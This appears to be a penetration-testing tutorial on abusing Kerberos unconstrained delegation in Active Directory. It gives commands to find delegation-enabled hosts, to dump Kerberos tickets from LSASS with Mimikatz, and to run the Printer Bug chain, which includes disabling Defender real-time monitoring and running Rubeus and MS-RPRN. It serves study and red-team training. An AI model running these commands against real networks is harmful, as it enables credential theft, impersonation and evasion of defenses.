# Unconstrained Delegation

Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.

For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.

Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.

There are two types of Kerberos Delegation:

- General/Basic or Unconstrained Delegation - This allows the first hop server to request access to any service on any computer in the domain
- Constrained Delegation - This allows the first hop server to request access only to specified services on specified computers.

This a feature that a Domain Administrator can set to any Computer inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have Administrator privileges on the machine, you will be able to dump the tickets and impersonate the users on any machine.

To discover computers on the domain which have untrusted delegation enabled:

## PowerView

```powershell
# This will print out the full details of the Computers
Get-NetComputer -Unconstrained # DC's always appear on the list, but they aren't useful for PrivEsc

# Simplified Output
Get-NetComputer -Unconstrained | select cn

```

## Active Directory Module

```powershell
# This will print out the full details of the Computers
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# Simplified Output
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select SamAccountName
```

You can also search for Active Directory Users using `Get-ADUser -Filter {TrustedForDelegation -eq $True}`

## Compromise

Once a target machine has been identified where Unconstrained Delegation has been enabled it is possible to dump the hashes using Mimikatz with the command `Invoke-Mimikatz -Command '"sekurlsa::tickets"'` or you can try as a backup `Invoke-Mimikatz -Command '"kerberos::list /export"'` 

This is either a waiting game for a DA or other privileged user to access the system or trick them to connect to a machine with Unconstrained Delegation

### Printer Bug

A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.

On the target server, we first disabled RealtimeMonitoring and then copied over the file `Rubeus.exe` and entered the command `.\Rubeus.exe monitor /interval:5 /nowrap` and then on our attack machine we ran the command `.\MS-RPRN.exe <print_machine> <unconstrainedmachine>`
